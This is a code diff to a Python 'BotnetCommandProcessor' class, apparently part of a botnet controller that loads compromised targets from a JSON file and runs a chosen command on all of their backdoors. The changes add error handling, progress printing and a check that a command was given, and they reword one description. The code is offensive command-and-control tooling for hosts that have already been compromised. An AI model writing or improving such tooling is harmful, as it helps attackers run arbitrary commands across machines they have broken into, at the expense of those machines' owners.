@@ -52,9 +52,8 @@ class BotnetCommandProcessor(CommandProcessor):
         }
         self.commands["run"] = {
             "method": self.__run,
-            "description": ("Run a command on all of the backdoors. As if you"
-                                " ran the 'ran' command on each backdoor "
-                                "individually"),
+            "description": ("Run a command on all of the backdoors. You ran"
+                                "each command on each exploit individually"),
             "usage": ("run command"
                       "    command: the command to be ran.")
         }
@@ -155,12 +154,14 @@ class BotnetCommandProcessor(CommandProcessor):
                 data = json.load(open(path))
                 for target in data["targets"]:
                     try:
+                        print(f"{target['name']}: ")
                         self.__add((f"{target['name']} "
                                     f"{target['host']} "
                                     f"{target['path']} "
                                     f"{target['type']} "
                                     f"{target['method']} "
                                     f"{target['header']}"))
+                        print("-" * 80)
                     except CommandException as e:
                         print(str(e))
             except:
@@ -192,11 +193,13 @@ class BotnetCommandProcessor(CommandProcessor):
 
     """
     @brief Run a command on each of the backdoors.
-    @param options the comand to be ran.
+    @param options the command to be ran.
     """
     def __run(self, options: str):
         if len(self.targets) == 0:
             raise CommandException("No targets added.")
+        if len(options) == 0:
+            raise CommandException("No command specified.")
         
         try:
             print(f"{self.targets[0]['name']}: ")
@@ -205,9 +208,12 @@ class BotnetCommandProcessor(CommandProcessor):
             print(str(e))
 
         for target in self.targets[1:]:
-            print("-" * 80)
-            print(f"{target['name']}: ")
-            target["processor"].process_command(options)
+            try:
+                print("-" * 80)
+                print(f"{target['name']}: ")
+                target["processor"].process_command(options)
+            except CommandException as e:
+                print(str(e))
             
     """
     @brief See base class for details.
